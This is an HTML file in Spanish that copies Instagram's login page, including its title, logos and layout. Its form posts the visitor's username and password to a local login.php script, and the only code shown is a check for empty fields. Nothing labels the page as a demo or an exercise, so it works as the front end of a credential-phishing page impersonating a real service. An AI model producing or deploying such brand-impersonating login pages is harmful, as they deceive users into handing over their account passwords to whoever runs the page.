<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Iniciar sesión - Instagram</title>
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
      font-family: Arial, sans-serif;
    }

    body {
      background-color: #fafafa;
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
      padding: 20px;
    }

    .container {
      display: flex;
      width: 900px;
      height: 600px;
      background-color: white;
      box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
      border-radius: 10px;
      overflow: hidden;
    }

    .image-side {
      flex: 1.5;
      background-color: #fff;
      display: flex;
      align-items: center;
      justify-content: center;
    }

    .image-side img {
      width: 100%;
      height: 100%;
      object-fit: cover;
    }

    .login-side {
      flex: 1;
      padding: 40px;
      display: flex;
      flex-direction: column;
      justify-content: center;
      align-items: center;
    }

    .logo-img {
      width: 280px;
      max-width: 100%;
      margin-bottom: 30px;
    }

    form {
      display: flex;
      flex-direction: column;
      width: 100%;
      max-width: 300px;
    }

    input {
      padding: 12px;
      margin-bottom: 10px;
      border: 1px solid #ccc;
      border-radius: 4px;
      font-size: 14px;
    }

    button {
      background-color: #3897f0;
      color: white;
      border: none;
      padding: 12px;
      border-radius: 4px;
      font-weight: bold;
      cursor: pointer;
      margin-top: 5px;
      font-size: 16px;
    }

    .divider {
      text-align: center;
      margin: 15px 0;
      position: relative;
    }

    .divider span {
      background: #fff;
      padding: 0 10px;
      color: #999;
      position: relative;
      z-index: 1;
      font-size: 14px;
    }

    .divider::before {
      content: "";
      height: 1px;
      background: #ccc;
      position: absolute;
      width: 100%;
      top: 50%;
      left: 0;
      z-index: 0;
    }

    .facebook-login {
      color: #385185;
      text-align: center;
      margin-bottom: 10px;
      text-decoration: none;
      font-weight: bold;
      font-size: 14px;
    }

    .forgot {
      font-size: 12px;
      text-align: center;
      color: #00376b;
      margin-bottom: 20px;
      text-decoration: none;
    }

    .signup {
      font-size: 14px;
      margin-top: 20px;
      text-align: center;
    }

    .signup a {
      color: #3897f0;
      font-weight: bold;
      text-decoration: none;
    }

    .app-links {
      margin-top: 30px;
      text-align: center;
    }

    .app-links img {
      width: 250px;
      max-width: 100%;
    }

    /* Responsive para pantallas pequeñas */
    @media (max-width: 768px) {
      .container {
        flex-direction: column;
        width: 100%;
        height: auto;
        max-width: 400px;
        border-radius: 0;
        box-shadow: none;
      }

      .image-side {
        flex: none;
        height: 300px;
        width: 100%;
      }

      .image-side img {
        height: 100%;
        width: 100%;
        object-fit: contain;
      }

      .login-side {
        flex: none;
        padding: 20px;
        width: 100%;
        height: auto;
      }

      .logo-img {
        width: 200px;
        margin-bottom: 20px;
      }

      form {
        max-width: 100%;
      }

      input, button {
        font-size: 16px;
      }
    }
  </style>
</head>
<body>

<div class="container">
  <div class="image-side">
    <img src="logoprincipal.png" alt="Imagen Instagram grande">
  </div>

  <div class="login-side">
    <img src="instagram-logo.png" alt="Instagram logo" class="logo-img">
    <form id="loginForm" method="POST" action="login.php">
      <input type="text" name="usuario" id="usuario" placeholder="Teléfono, usuario o correo electrónico" required>
      <input type="password" name="contrasena" id="contrasena" placeholder="Contraseña" required>
      <button type="submit">Iniciar sesión</button>
      <div class="divider"><span>o</span></div>
      <a href="http://localhost/mi%20proyecto/index.html" class="facebook-login">Iniciar sesión con Facebook</a>
      <a href="#" class="forgot">¿Olvidaste tu contraseña?</a>
    </form>
    <div class="signup">
      ¿No tienes una cuenta? <a href="#">Regístrate</a>
    </div>
    <div class="app-links">
      <p>Descarga la app.</p>
      <img src="debago.png" alt="Botones de descarga" />
    </div>
  </div>
</div>

<script>
  document.getElementById("loginForm").addEventListener("submit", function(e) {
    const usuario = document.getElementById("usuario").value.trim();
    const contrasena = document.getElementById("contrasena").value.trim();
    if (!usuario || !contrasena) {
      e.preventDefault();
      alert("Por favor, completa todos los campos.");
    }
  });
</script>

</body>
</html>
